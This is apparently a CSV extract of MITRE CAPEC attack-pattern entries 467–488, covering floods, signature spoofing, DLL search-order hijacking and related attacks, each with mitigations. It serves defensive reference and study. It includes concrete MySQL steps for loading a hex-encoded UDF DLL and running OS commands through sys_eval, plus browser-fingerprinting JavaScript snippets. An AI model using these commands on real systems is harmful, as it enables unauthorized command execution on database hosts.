CAPEC-467,Cross Site Identification,Detailed,Draft,"An attacker harvests identifying information about a victim via an active session that the victim's browser has with a social networking site. A victim may have the social networking site open in one tab or perhaps is simply using the remember me feature to keep their session with the social networking site active. An attacker induces a payload to execute in the victim's browser that transparently to the victim initiates a request to the social networking site (e.g., via available social network site APIs) to retrieve identifying information about a victim. While some of this information may be public, the attacker is able to harvest this information in context and may use it for further attacks on the user (e.g., spear phishing).",N/A,N/A,Low,::NATURE:ChildOf:CAPEC ID:62::,N/A,::The victim has an active session with the social networking site.::,"::SKILL:An attacker should be able to create a payload and deliver it to the victim's browser.:LEVEL:High::SKILL:An attacker needs to know how to interact with various social networking sites (e.g., via available APIs) to request information and how to send the harvested data back to the attacker.:LEVEL:Medium::",N/A,N/A,N/A,::Usage: Users should always explicitly log out from the social networking sites when done using them.::Usage: Users should not open other tabs in the browser when using a social networking site.::,"::An attacker may post a malicious posting that contains an image with an embedded link. The link actually requests identifying information from the social networking site. A victim who views the malicious posting in their browser will have sent identifying information to the attacker, as long as the victim had an active session with the social networking site.::",::352::359::,N/A,N/A,https://capec.mitre.org/data/definitions/467.html
CAPEC-469,HTTP DoS,Standard,Draft,An attacker performs flooding at the HTTP level to bring down only a particular web application rather than anything listening on a TCP/IP connection. This denial of service attack requires substantially fewer packets to be sent which makes DoS harder to detect. This is an equivalent of SYN flood in HTTP. The idea is to keep the HTTP session alive indefinitely and then repeat that hundreds of times. This attack targets resource depletion weaknesses in web server software. The web server will wait to attacker's responses on the initiated HTTP sessions while the connection threads are being exhausted.,N/A,N/A,Low,::NATURE:ChildOf:CAPEC ID:227::,N/A,::HTTP protocol is usedWeb server used is vulnerable to denial of service via HTTP flooding::,N/A,::Ability to issues hundreds of HTTP requests::,N/A,N/A,::Configuration: Configure web server software to limit the waiting period on opened HTTP sessions::Design: Use load balancing mechanisms::,N/A,::770::772::,TAXONOMY NAME:ATTACK:ENTRY ID:1499.001:ENTRY NAME:Endpoint Denial of Service:OS Exhaustion Flood::,N/A,https://capec.mitre.org/data/definitions/469.html
CAPEC-47,Buffer Overflow via Parameter Expansion,Detailed,Draft,"In this attack, the target software is given input that the adversary knows will be modified and expanded in size during processing. This attack relies on the target software failing to anticipate that the expanded data may exceed some internal limit, thereby creating a buffer overflow.",N/A,Medium,High,::NATURE:ChildOf:CAPEC ID:100::,"::STEP:1:PHASE:Explore:DESCRIPTION:[Identify target application] The adversary identifies a target application or program to perform the buffer overflow on. Adversaries often look for applications that accept user input and that perform manual memory management.::STEP:2:PHASE:Experiment:DESCRIPTION:[Find injection vector] The adversary identifies an injection vector to deliver the excessive content to the targeted application's buffer.TECHNIQUE:In this attack, the normal method of providing large user input does not work. The program performs bounds checking on the user input, but not the expanded user input. The adversary needs to provide input that they believe will be expanded by the program to overflow a buffer. To identify where this is possible, an adversary either needs to have knowledge of the inner workings of the program or use a disassembler and other reverse engineering tools to guide the search.::STEP:3:PHASE:Experiment:DESCRIPTION:[Craft overflow content] The adversary crafts the input to be given to the program. If the intent is to simply cause the software to crash, the input needs only to expand to an excessive quantity of random data. If the intent is to leverage the overflow for execution of arbitrary code, the adversary will craft input that expands in a way that not only overflows the targeted buffer but does so in such a way that the overwritten return address is replaced with one of the adversaries' choosing which points to code injected by the adversary.TECHNIQUE:Create specific files and directories on the system and then give input using path traversal shortcuts to those directories that could expand past an input buffer.::STEP:4:PHASE:Exploit:DESCRIPTION:[Overflow the buffer] Using the injection vector, the adversary gives the crafted input to the program, overflowing the buffer.::","::The program expands one of the parameters passed to a function with input controlled by the user, but a later function making use of the expanded parameter erroneously considers the original, not the expanded size of the parameter.::The expanded parameter is used in the context where buffer overflow may become possible due to the incorrect understanding of the parameter size (i.e. thinking that it is smaller than it really is).::","::SKILL:Finding this particular buffer overflow may not be trivial. Also, stack and especially heap based buffer overflows require a lot of knowledge if the intended goal is arbitrary code execution. Not only that the adversary needs to write the shell code to accomplish their goals, but the adversary also needs to find a way to get the program execution to jump to the planted shell code. There also needs to be sufficient room for the payload. So not every buffer overflow will be exploitable, even by a skilled adversary.:LEVEL:High::",::Access to the program source or binary. If the program is only available in binary then a disassembler and other reverse engineering tools will be helpful.::,N/A,::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Gain Privileges::SCOPE:AvailabilityTECHNICAL IMPACT:Unreliable Execution::SCOPE:IntegrityTECHNICAL IMPACT:Modify Data::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:AvailabilityTECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Confidentiality Integrity Availability Execute Unauthorized Commands Run Arbitrary Code::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::,::Ensure that when parameter expansion happens in the code that the assumptions used to determine the resulting size of the parameter are accurate and that the new size of the parameter is visible to the whole system::,"::Attack Example: FTP glob() The glob() function in FTP servers has been susceptible to attack as a result of incorrect resizing. This is an ftpd glob() Expansion LIST Heap Overflow Vulnerability. ftp daemon contains a heap-based buffer overflow condition. The overflow occurs when the LIST command is issued with an argument that expands into an oversized string after being processed by glob(). This buffer overflow occurs in memory that is dynamically allocated. It may be possible for adversaries to exploit this vulnerability and execute arbitrary code on the affected host. To exploit this, the adversary must be able to create directories on the target host. The glob() function is used to expand short-hand notation into complete file names. By sending to the FTP server a request containing a tilde (~) and other wildcard characters in the pathname string, a remote adversary can overflow a buffer and execute arbitrary code on the FTP server to gain root privileges. Once the request is processed, the glob() function expands the user input, which could exceed the expected length. In order to exploit this vulnerability, the adversary must be able to create directories on the FTP server. [REF-1]See also: CVE-2001-0249::Buffer overflow in the glob implementation in libc in NetBSD-current before 20050914, and NetBSD 2.* and 3.* before 20061203, as used by the FTP daemon, allows remote authenticated users to execute arbitrary code via a long pathname that results from path expansion. The limit computation of an internal buffer was done incorrectly. The size of the buffer in byte was used as element count, even though the elements of the buffer are 2 bytes long. Long expanded path names would therefore overflow the buffer.See also: CVE-2006-6652::",::120::119::118::130::131::74::20::680::697::,N/A,N/A,https://capec.mitre.org/data/definitions/47.html
CAPEC-470,Expanding Control over the Operating System from the Database,Detailed,Draft,"An attacker is able to leverage access gained to the database to read / write data to the file system, compromise the operating system, create a tunnel for accessing the host machine, and use this access to potentially attack other machines on the same network as the database machine. Traditionally SQL injections attacks are viewed as a way to gain unauthorized read access to the data stored in the database, modify the data in the database, delete the data, etc. However, almost every data base management system (DBMS) system includes facilities that if compromised allow an attacker complete access to the file system, operating system, and full access to the host running the database. The attacker can then use this privileged access to launch subsequent attacks. These facilities include dropping into a command shell, creating user defined functions that can call system level libraries present on the host machine, stored procedures, etc.",N/A,N/A,Very High,::NATURE:ChildOf:CAPEC ID:66::,"::STEP:1:PHASE:Explore:DESCRIPTION:The adversary identifies a database management system running on a machine they would like to gain control over, or on a network they want to move laterally through.::STEP:2:PHASE:Experiment:DESCRIPTION:The adversary goes about the typical steps of an SQL injection and determines if an injection is possible.::STEP:3:PHASE:Experiment:DESCRIPTION:Once the Adversary determines that an SQL injection is possible, they must ensure that the requirements for the attack are met. These are a high privileged session user and batched query support. This is done in similar ways to discovering if an SQL injection is possible.::STEP:4:PHASE:Experiment:DESCRIPTION:If the requirements are met, based on the database management system that is running, the adversary will find or create user defined functions (UDFs) that can be loaded as DLLs. An example of a DLL can be found at https://github.com/rapid7/metasploit-framework/tree/master/data/exploits/mysql::STEP:5:PHASE:Experiment:DESCRIPTION:In order to load the DLL, the adversary must first find the path to the plugin directory. The command to achieve this is different based on the type of DBMS, but for MySQL, this can be achieved by running the command select @@plugin_dir::STEP:6:PHASE:Exploit:DESCRIPTION:The DLL is then moved into the previously found plugin directory so that the contained functions can be loaded. This can be done in a number of ways; loading from a network share, writing the entire hex encoded string to a file in the plugin directory, or loading the DLL into a table and then into a file. An example using MySQL to load the hex string is as follows. select 0x4d5a9000... into dump file {plugin directory}udf.dll;::STEP:6:PHASE:Exploit:DESCRIPTION:Once the DLL is in the plugin directory, a command is then run to load the UDFs. An example of this in MySQL is create function sys_eval returns string soname 'udf.dll'; The function sys_eval is specific to the example DLL listed above.::STEP:6:PHASE:Exploit:DESCRIPTION:Once the adversary has loaded the desired function(s), they will use these to execute arbitrary commands on the compromised system. This is done through a simple select command to the loaded UDF. For example: select sys_eval('dir');. Because the prerequisite to this attack is that the database session user is a super user, this means that the adversary will be able to execute commands with elevated privileges.::",::A vulnerable DBMS is usedA SQL injection exists that gives an attacker access to the database or an attacker has access to the DBMS via other means::,::SKILL:Low level knowledge of the various facilities available in different DBMS systems for interacting with the file system and operating system:LEVEL:High::,N/A,N/A,N/A,::Design: Follow the defensive programming practices needed to protect an application accessing the database from SQL injection::Configuration: Ensure that the DBMS is patched with the latest security patches::Design: Ensure that the DBMS login used by the application has the lowest possible level of privileges in the DBMS::Design: Ensure that DBMS runs with the lowest possible level of privileges on the host machine and that it runs as a separate user::Usage: Do not use the DBMS machine for anything else other than the database::Usage: Do not place any trust in the database host on the internal network. Authenticate and validate all network activity originating from the database host.::Usage: Use an intrusion detection system to monitor network connections and logs on the database host.::Implementation: Remove / disable all unneeded / unused functions of the DBMS system that may allow an attacker to elevate privileges if compromised::,N/A,::250::89::,N/A,N/A,https://capec.mitre.org/data/definitions/470.html
CAPEC-471,Search Order Hijacking,Detailed,Stable,An adversary exploits a weakness in an application's specification of external libraries to exploit the functionality of the loader where the process loading the library searches first in the same directory in which the process binary resides and then in other directories. Exploitation of this preferential search order can allow an attacker to make the loading process load the adversary's rogue library rather than the legitimate library. This attack can be leveraged with many different libraries and with many different loading processes. No forensic trails are left in the system's registry or file system that an incorrect library had been loaded.,N/A,N/A,Medium,::NATURE:ChildOf:CAPEC ID:159::,"::STEP:1:PHASE:Explore:DESCRIPTION:[Identify target general susceptibility] An attacker uses an automated tool or manually finds whether the target application uses dynamically linked libraries and the configuration file or look up table (such as Procedure Linkage Table) which contains the entries for dynamically linked libraries.TECHNIQUE:The attacker uses a tool such as the OSX otool utility or manually probes whether the target application uses dynamically linked libraries.:TECHNIQUE:The attacker finds the configuration files containing the entries to the dynamically linked libraries and modifies the entries to point to the malicious libraries the attacker crafted.::STEP:2:PHASE:Experiment:DESCRIPTION:[Craft malicious libraries] The attacker uses knowledge gained in the Explore phase to craft malicious libraries that they will redirect the target to leverage. These malicious libraries could have the same APIs as the legitimate library and additional malicious code.TECHNIQUE:The attacker monitors the file operations performed by the target application using a tool like dtrace or FileMon. And the attacker can delay the operations by using sleep(2) and usleep() to prepare the appropriate conditions for the attack, or make the application perform expansive tasks (large files parsing, etc.) depending on the purpose of the application.::STEP:3:PHASE:Exploit:DESCRIPTION:[Redirect the access to libraries to the malicious libraries] The attacker redirects the target to the malicious libraries they crafted in the Experiment phase. The attacker will be able to force the targeted application to execute arbitrary code when the application attempts to access the legitimate libraries.TECHNIQUE:The attacker modifies the entries in the configuration files pointing to the malicious libraries they crafted.:TECHNIQUE:The attacker leverages symlink/timing issues to redirect the target to access the malicious libraries they crafted. See also: CAPEC-132.:TECHNIQUE:The attacker leverages file search path order issues to redirect the target to access the malicious libraries they crafted. See also: CAPEC-38.::",::Attacker has a mechanism to place its malicious libraries in the needed location on the file system.::,::SKILL:Ability to create a malicious library.:LEVEL:Medium::,N/A,N/A,N/A,::Design: Fix the Windows loading process to eliminate the preferential search order by looking for DLLs in the precise location where they are expected::Design: Sign system DLLs so that unauthorized DLLs can be detected.::,"::For instance, an attacker with access to the file system may place a malicious ntshrui.dll in the C:Windows directory. This DLL normally resides in the System32 folder. Process explorer.exe which also resides in C:Windows, upon trying to load the ntshrui.dll from the System32 folder will actually load the DLL supplied by the attacker simply because of the preferential search order. Since the attacker has placed its malicious ntshrui.dll in the same directory as the loading explorer.exe process, the DLL supplied by the attacker will be found first and thus loaded in lieu of the legitimate DLL. Since explorer.exe is loaded during the boot cycle, the attackers' malware is guaranteed to execute.::macOS and OS X use a common method to look for required dynamic libraries (dylib) to load into a program based on search paths. Adversaries can take advantage of ambiguous paths to plant dylibs to gain privilege escalation or persistence. A common method is to see what dylibs an application uses, then plant a malicious version with the same name higher up in the search path. This typically results in the dylib being in the same folder as the application itself. If the program is configured to run at a higher privilege level than the current user, then when the dylib is loaded into the application, the dylib will also run at that elevated level.::",::427::,TAXONOMY NAME:ATTACK:ENTRY ID:1574.001:ENTRY NAME:Hijack Execution Flow:DLL search order hijacking::::TAXONOMY NAME:ATTACK:ENTRY ID:1574.004:ENTRY NAME:Hijack Execution Flow:Dylib Hijacking::,N/A,https://capec.mitre.org/data/definitions/471.html
CAPEC-472,Browser Fingerprinting,Detailed,Draft,"An attacker carefully crafts small snippets of Java Script to efficiently detect the type of browser the potential victim is using. Many web-based attacks need prior knowledge of the web browser including the version of browser to ensure successful exploitation of a vulnerability. Having this knowledge allows an attacker to target the victim with attacks that specifically exploit known or zero day weaknesses in the type and version of the browser used by the victim. Automating this process via Java Script as a part of the same delivery system used to exploit the browser is considered more efficient as the attacker can supply a browser fingerprinting method and integrate it with exploit code, all contained in Java Script and in response to the same web page request by the browser.",N/A,N/A,Low,::NATURE:ChildOf:CAPEC ID:541::,N/A,::Victim's browser visits a website that contains attacker's Java ScriptJava Script is not disabled in the victim's browser::,N/A,N/A,N/A,N/A,::Configuration: Disable Java Script in the browser::,::The following code snippets can be used to detect various browsers: Firefox 2/3 FF=/a/[-1]=='a' Firefox 3 FF3=(function x(){})[-5]=='x' Firefox 2 FF2=(function x(){})[-6]=='x' IE IE='v'=='v' Safari Saf=/a/.__proto__=='//' Chrome Chr=/source/.test((/a/.toString+'')) Opera Op=/^function (/.test([].sort)::,::200::,N/A,N/A,https://capec.mitre.org/data/definitions/472.html
CAPEC-473,Signature Spoof,Standard,Draft,"An attacker generates a message or datablock that causes the recipient to believe that the message or datablock was generated and cryptographically signed by an authoritative or reputable source, misleading a victim or victim operating system into performing malicious actions.",N/A,N/A,N/A,::NATURE:ChildOf:CAPEC ID:151::,N/A,::The victim or victim system is dependent upon a cryptographic signature-based verification system for validation of one or more security events or actions.::The validation can be bypassed via an attacker-provided signature that makes it appear that the legitimate authoritative or reputable source provided the signature.::,::SKILL:Technical understanding of how signature verification algorithms work with data and applications:LEVEL:High::,N/A,N/A,::SCOPE:Access Control:SCOPE:AuthenticationTECHNICAL IMPACT:Gain Privileges::,N/A,"::An attacker provides a victim with a malicious executable disguised as a legitimate executable from an established software by signing the executable with a forged cryptographic key. The victim's operating system attempts to verify the executable by checking the signature, the signature is considered valid, and the attackers' malicious executable runs.::An attacker exploits weaknesses in a cryptographic algorithm to that allow a private key for a legitimate software vendor to be reconstructed, attacker-created malicious software is cryptographically signed with the reconstructed key, and is installed by the victim operating system disguised as a legitimate software update from the software vendor.::",::20::327::290::,N/A,N/A,https://capec.mitre.org/data/definitions/473.html
CAPEC-474,Signature Spoofing by Key Theft,Detailed,Draft,An attacker obtains an authoritative or reputable signer's private signature key by theft and then uses this key to forge signatures from the original signer to mislead a victim into performing actions that benefit the attacker.,N/A,Medium,High,::NATURE:ChildOf:CAPEC ID:473::,N/A,::An authoritative or reputable signer is storing their private signature key with insufficient protection.::,::SKILL:Knowledge of common location methods and access methods to sensitive data:LEVEL:Low::SKILL:Ability to compromise systems containing sensitive data:LEVEL:High::,N/A,N/A,N/A,::Restrict access to private keys from non-supervisory accounts::Restrict access to administrative personnel and processes only::Ensure all remote methods are secured::Ensure all services are patched and up to date::,N/A,::522::,N/A,N/A,https://capec.mitre.org/data/definitions/474.html
CAPEC-475,Signature Spoofing by Improper Validation,Detailed,Draft,An adversary exploits a cryptographic weakness in the signature verification algorithm implementation to generate a valid signature without knowing the key.,N/A,Low,High,::NATURE:ChildOf:CAPEC ID:473::NATURE:CanPrecede:CAPEC ID:542::,N/A,"::Recipient is using a weak cryptographic signature verification algorithm or a weak implementation of a cryptographic signature verification algorithm, or the configuration of the recipient's application accepts the use of keys generated using cryptographically weak signature verification algorithms.::",::SKILL:Cryptanalysis of signature verification algorithm:LEVEL:High::SKILL:Reverse engineering and cryptanalysis of signature verification algorithm implementation:LEVEL:High::,N/A,N/A,N/A,::Use programs and products that contain cryptographic elements that have been thoroughly tested for flaws in the signature verification routines.::,"::The Windows CryptoAPI (Crypt32.dll) was shown to be vulnerable to signature spoofing by failing to properly validate Elliptic Curve Cryptography (ECC) certificates. If the CryptoAPI's signature validator allows the specification of a nonstandard base point (G): An adversary can create a custom ECDSA certificate with an elliptic curve (ECC) signature that appears to match a known standard curve, like P-256 that includes a public key for an existing known trusted certificate authority, but which was in fact not signed by that certificate authority. Windows checks the public key and other curve parameters, but not the (bespoke adversary-supplied) base point generator (G) parameter constant which actually generated the curve [REF-562]. Exploiting this vulnerability allows the adversary to leverage a spoofed certificate to dupe trusted network connections and deliver/execute malicious code, while appearing as legitimately trusted entity [REF-563]. This ultimately tricks the victim into believing the malicious website or executable is legitimate and originates from a properly verified source. See also: CVE-2020-0601::",::347::327::295::,N/A,N/A,https://capec.mitre.org/data/definitions/475.html
CAPEC-476,Signature Spoofing by Misrepresentation,Detailed,Draft,"An attacker exploits a weakness in the parsing or display code of the recipient software to generate a data blob containing a supposedly valid signature, but the signer's identity is falsely represented, which can lead to the attacker manipulating the recipient software or its victim user to perform compromising actions.",N/A,Low,High,::NATURE:ChildOf:CAPEC ID:473::,N/A,"::Recipient is using signature verification software that does not clearly indicate potential homographs in the signer identity.Recipient is using signature verification software that contains a parsing vulnerability, or allows control characters in the signer identity field, such that a signature is mistakenly displayed as valid and from a known or authoritative signer.::","::SKILL:Attacker needs to understand the layout and composition of data blobs used by the target application.:LEVEL:High::SKILL:To discover a specific vulnerability, attacker needs to reverse engineer signature parsing, signature verification and signer representation code.:LEVEL:High::SKILL:Attacker may be required to create malformed data blobs and know how to insert them in a location that the recipient will visit.:LEVEL:High::",N/A,N/A,N/A,"::Ensure the application is using parsing and data display techniques that will accurately display control characters, international symbols and markings, and ultimately recognize potential homograph attacks.::",N/A,::290::,N/A,N/A,https://capec.mitre.org/data/definitions/476.html
CAPEC-477,Signature Spoofing by Mixing Signed and Unsigned Content,Detailed,Draft,"An attacker exploits the underlying complexity of a data structure that allows for both signed and unsigned content, to cause unsigned data to be processed as though it were signed data.",N/A,Low,High,::NATURE:ChildOf:CAPEC ID:473::,N/A,::Signer and recipient are using complex data storage structures that allow for a mix between signed and unsigned data::Recipient is using signature verification software that does not maintain separation between signed and unsigned data once the signature has been verified.::,"::SKILL:The attacker may need to continuously monitor a stream of signed data, waiting for an exploitable message to appear.:LEVEL:High::SKILL:Attacker must be able to create malformed data blobs and know how to insert them in a location that the recipient will visit.:LEVEL:High::",N/A,N/A,N/A,::Ensure the application is fully patched and does not allow the processing of unsigned data as if it is signed data.::,N/A,::693::311::319::,N/A,N/A,https://capec.mitre.org/data/definitions/477.html
CAPEC-478,Modification of Windows Service Configuration,Detailed,Usable,An adversary exploits a weakness in access control to modify the execution parameters of a Windows service. The goal of this attack is to execute a malicious binary in place of an existing service.,N/A,Low,High,::NATURE:ChildOf:CAPEC ID:203::,"::STEP:1:PHASE:Explore:DESCRIPTION:[Determine target system] The adversary must first determine the system they wish to modify the registry of. This needs to be a windows machine as this attack only works on the windows registry.::STEP:2:PHASE:Experiment:DESCRIPTION:[Gain access to the system] The adversary needs to gain access to the system in some way so that they can modify the windows registry.TECHNIQUE:Gain physical access to a system either through shoulder surfing a password or accessing a system that is left unlocked.:TECHNIQUE:Gain remote access to a system through a variety of means.::STEP:3:PHASE:Exploit:DESCRIPTION:[Modify windows registry] The adversary will modify the windows registry by changing the configuration settings for a service. Specifically, the adversary will change the path settings to define a path to a malicious binary to be executed.::",::The adversary must have the capability to write to the Windows Registry on the targeted system.::,N/A,::None: No specialized resources are required to execute this type of attack.::,N/A,"::SCOPE:IntegrityTECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Integrity Execute Unauthorized Commands By altering specific configuration settings for the service, the adversary could run arbitrary code to be executed.::",::Ensure proper permissions are set for Registry hives to prevent users from modifying keys for system components that may lead to privilege escalation.::,N/A,::284::,TAXONOMY NAME:ATTACK:ENTRY ID:1574.011:ENTRY NAME:Hijack Execution Flow:Service Registry Permissions Weakness::::TAXONOMY NAME:ATTACK:ENTRY ID:1543.003:ENTRY NAME:Create or Modify System Process:Windows Service::,N/A,https://capec.mitre.org/data/definitions/478.html
CAPEC-479,Malicious Root Certificate,Detailed,Stable,"An adversary exploits a weakness in authorization and installs a new root certificate on a compromised system. Certificates are commonly used for establishing secure TLS/SSL communications within a web browser. When a user attempts to browse a website that presents a certificate that is not trusted an error message will be displayed to warn the user of the security risk. Depending on the security settings, the browser may not allow the user to establish a connection to the website. Adversaries have used this technique to avoid security warnings prompting users when compromised systems connect over HTTPS to adversary controlled web servers that spoof legitimate websites in order to collect login credentials.",N/A,Low,Low,::NATURE:ChildOf:CAPEC ID:473::,N/A,::The adversary must have the ability to create a new root certificate.::,N/A,N/A,N/A,N/A,N/A,N/A,::284::,TAXONOMY NAME:ATTACK:ENTRY ID:1553.004:ENTRY NAME:Subvert Trust Controls:Install Root Certificate::,N/A,https://capec.mitre.org/data/definitions/479.html
CAPEC-48,Passing Local Filenames to Functions That Expect a URL,Standard,Draft,"This attack relies on client side code to access local files and resources instead of URLs. When the client browser is expecting a URL string, but instead receives a request for a local file, that execution is likely to occur in the browser process space with the browser's authority to local files. The attacker can send the results of this request to the local files out to a site that they control. This attack may be used to steal sensitive authentication data (either local or remote), or to gain system profile information to launch further attacks.",N/A,High,High,::NATURE:ChildOf:CAPEC ID:212::,"::STEP:1:PHASE:Explore:DESCRIPTION:[Identify web application URL inputs] Review application inputs to find those that are designed to be URLs.TECHNIQUE:Manually navigate web site pages to identify URLs.:TECHNIQUE:Use automated tools to identify URLs.::STEP:2:PHASE:Experiment:DESCRIPTION:[Identify URL inputs allowing local access.] Execute test local commands via each URL input to determine which are successful.TECHNIQUE:Manually execute a local command (such as 'pwd') via the URL inputs.:TECHNIQUE:Using an automated tool, test each URL input for weakness.::STEP:3:PHASE:Exploit:DESCRIPTION:[Execute malicious commands] Using the identified URL inputs that allow local command execution, execute malicious commands.TECHNIQUE:Execute local commands via the URL input.::","::The victim's software must not differentiate between the location and type of reference passed the client software, e.g. browser::",::SKILL:Attacker identifies known local files to exploit:LEVEL:Medium::,N/A,N/A,::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::SCOPE:IntegrityTECHNICAL IMPACT:Modify Data::,::Implementation: Ensure all content that is delivered to client is sanitized against an acceptable content specification.::Implementation: Ensure all configuration files and resource are either removed or protected when promoting code into production.::Design: Use browser technologies that do not allow client side scripting.::Implementation: Perform input validation for all remote content.::Implementation: Perform output validation for all remote content.::Implementation: Disable scripting languages such as JavaScript in browser::,"::J2EE applications frequently use .properties files to store configuration information including JDBC connections, LDAP connection strings, proxy information, system passwords and other system metadata that is valuable to attackers looking to probe the system or bypass policy enforcement points. When these files are stored in publicly accessible directories and are allowed to be read by the public user, then an attacker can list the directory identify a .properties file and simply load its contents in the browser listing its contents. A standard Hibernate properties file contains hibernate.connection.driver_class = org.postgresql.Driverhibernate.connection.url = jdbc:postgresql://localhost/mydatabasehibernate.connection.username = usernamehibernate.connection.password = passwordhibernate.c3p0.min_size=5hibernate.c3p0.max_size=20 Even if the attacker cannot write this file, there is plenty of information to leverage to gain further access.::",::241::706::,N/A,N/A,https://capec.mitre.org/data/definitions/48.html
CAPEC-480,Escaping Virtualization,Standard,Draft,"An adversary gains access to an application, service, or device with the privileges of an authorized or privileged user by escaping the confines of a virtualized environment. The adversary is then able to access resources or execute unauthorized code within the host environment, generally with the privileges of the user running the virtualized process. Successfully executing an attack of this type is often the first step in executing more complex attacks.",N/A,Low,Very High,::NATURE:ChildOf:CAPEC ID:115::,"::STEP:1:PHASE:Explore:DESCRIPTION:[Probing] The adversary probes the target application, service, or device to find a possible weakness that would allow escaping the virtualized environment.TECHNIQUE:Probing applications, services, or devices for virtualization weaknesses.::STEP:2:PHASE:Experiment:DESCRIPTION:[Verify the exploitable security weaknesses] Using the found weakness, the adversary attempts to escape the virtualized environment.TECHNIQUE:Using an application weakness to escape a virtualized environment::STEP:3:PHASE:Exploit:DESCRIPTION:[Execute more complex attacks] Once outside of the virtualized environment, the adversary attempts to perform other more complex attacks such as accessing system resources or executing unauthorized code within the host environment.TECHNIQUE:Executing complex attacks when given higher permissions by escaping a virtualized environment::",N/A,N/A,N/A,N/A,::SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Bypass Protection Mechanism::SCOPE:AuthorizationTECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Authorization Execute Unauthorized Commands Run Arbitrary Code::SCOPE:Accountability:SCOPE:Authentication:SCOPE:Authorization:SCOPE:Non-RepudiationTECHNICAL IMPACT:Gain Privileges::,::Ensure virtualization software is current and up-to-date.::Abide by the least privilege principle to avoid assigning users more privileges than necessary.::,N/A,::693::,TAXONOMY NAME:ATTACK:ENTRY ID:1611:ENTRY NAME:Escape to Host::,N/A,https://capec.mitre.org/data/definitions/480.html
CAPEC-482,TCP Flood,Standard,Draft,An adversary may execute a flooding attack using the TCP protocol with the intent to deny legitimate users access to a service. These attacks exploit the weakness within the TCP protocol where there is some state information for the connection the server needs to maintain.,N/A,N/A,N/A,::NATURE:ChildOf:CAPEC ID:125::,N/A,::This type of an attack requires the ability to generate a large amount of TCP traffic to send to the target port of a functioning server.::,N/A,N/A,N/A,N/A,"::To mitigate this type of an attack, an organization can monitor incoming packets and look for patterns in the TCP traffic to determine if the network is under an attack. The potential target may implement a rate limit on TCP SYN messages which would provide limited capabilities while under attack.::",N/A,::770::,TAXONOMY NAME:ATTACK:ENTRY ID:1499.001:ENTRY NAME:Endpoint Denial of Service:OS Exhaustion Flood::::TAXONOMY NAME:ATTACK:ENTRY ID:1498.001:ENTRY NAME:Network Denial of Service:Direct Network Flood::,N/A,https://capec.mitre.org/data/definitions/482.html
CAPEC-485,Signature Spoofing by Key Recreation,Detailed,Draft,An attacker obtains an authoritative or reputable signer's private signature key by exploiting a cryptographic weakness in the signature algorithm or pseudorandom number generation and then uses this key to forge signatures from the original signer to mislead a victim into performing actions that benefit the attacker.,N/A,Low,High,::NATURE:ChildOf:CAPEC ID:473::,N/A,::An authoritative signer is using a weak method of random number generation or weak signing software that causes key leakage or permits key inference.::An authoritative signer is using a signature algorithm with a direct weakness or with poorly chosen parameters that enable the key to be recovered using signatures from that signer.::,::SKILL:Cryptanalysis of signature generation algorithm:LEVEL:High::SKILL:Reverse engineering and cryptanalysis of signature generation algorithm implementation and random number generation:LEVEL:High::SKILL:Ability to create malformed data blobs and know how to present them directly or indirectly to a victim.:LEVEL:High::,N/A,N/A,N/A,::Ensure cryptographic elements have been sufficiently tested for weaknesses.::,N/A,::330::,N/A,N/A,https://capec.mitre.org/data/definitions/485.html
CAPEC-486,UDP Flood,Standard,Draft,"An adversary may execute a flooding attack using the UDP protocol with the intent to deny legitimate users access to a service by consuming the available network bandwidth. Additionally, firewalls often open a port for each UDP connection destined for a service with an open UDP port, meaning the firewalls in essence save the connection state thus the high packet nature of a UDP flood can also overwhelm resources allocated to the firewall. UDP attacks can also target services like DNS or VoIP which utilize these protocols. Additionally, due to the session-less nature of the UDP protocol, the source of a packet is easily spoofed making it difficult to find the source of the attack.",N/A,N/A,N/A,::NATURE:ChildOf:CAPEC ID:125::,N/A,::This type of an attack requires the ability to generate a large amount of UDP traffic to send to the desired port of a target service using UDP.::,N/A,N/A,N/A,N/A,"::To mitigate this type of an attack, modern firewalls drop UDP traffic destined for closed ports, and unsolicited UDP reply packets. A variety of other countermeasures such as universal reverse path forwarding and remote triggered black holing(RFC3704) along with modifications to BGP like black hole routing and sinkhole routing(RFC3882) help mitigate the spoofed source IP nature of these attacks.::",N/A,::770::,TAXONOMY NAME:ATTACK:ENTRY ID:1498.001:ENTRY NAME:Network Denial of Service:Direct Network Flood::,N/A,https://capec.mitre.org/data/definitions/486.html
CAPEC-487,ICMP Flood,Standard,Draft,"An adversary may execute a flooding attack using the ICMP protocol with the intent to deny legitimate users access to a service by consuming the available network bandwidth. A typical attack involves a victim server receiving ICMP packets at a high rate from a wide range of source addresses. Additionally, due to the session-less nature of the ICMP protocol, the source of a packet is easily spoofed making it difficult to find the source of the attack.",N/A,N/A,N/A,::NATURE:ChildOf:CAPEC ID:125::,N/A,::This type of an attack requires the ability to generate a large amount of ICMP traffic to send to the target server.::,N/A,N/A,N/A,N/A,"::To mitigate this type of an attack, an organization can enable ingress filtering. Additionally modifications to BGP like black hole routing and sinkhole routing(RFC3882) help mitigate the spoofed source IP nature of these attacks.::",N/A,::770::,TAXONOMY NAME:ATTACK:ENTRY ID:1498.001:ENTRY NAME:Network Denial of Service:Direct Network Flood::,N/A,https://capec.mitre.org/data/definitions/487.html
CAPEC-488,HTTP Flood,Standard,Draft,An adversary may execute a flooding attack using the HTTP protocol with the intent to deny legitimate users access to a service by consuming resources at the application layer such as web services and their infrastructure. These attacks use legitimate session-based HTTP GET requests designed to consume large amounts of a server's resources. Since these are legitimate sessions this attack is very difficult to detect.,N/A,N/A,N/A,::NATURE:ChildOf:CAPEC ID:125::,N/A,::This type of an attack requires the ability to generate a large amount of HTTP traffic to send to a target server.::,N/A,N/A,N/A,N/A,"::To mitigate this type of an attack, an organization can monitor the typical traffic flow. When spikes in usage occur, filters could examine traffic for indicators of bad behavior with respect to the web servers, and then create firewall rules to deny the malicious IP addresses. These patterns in the filter could be a combination of trained behavior, knowledge of standards as they apply to the web server, known patterns, or anomaly detection. Firewalling source IPs works since the HTTP is sent using TCP so the source IP can't be spoofed; if the source IP is spoofed is, then it's not legitimate traffic. Special care should be taken care with rule sets to ensure low false positive rates along with a method at the application layer to allow a valid user to begin using the service again. Another possible solution is using 3rd party providers as they have experts, 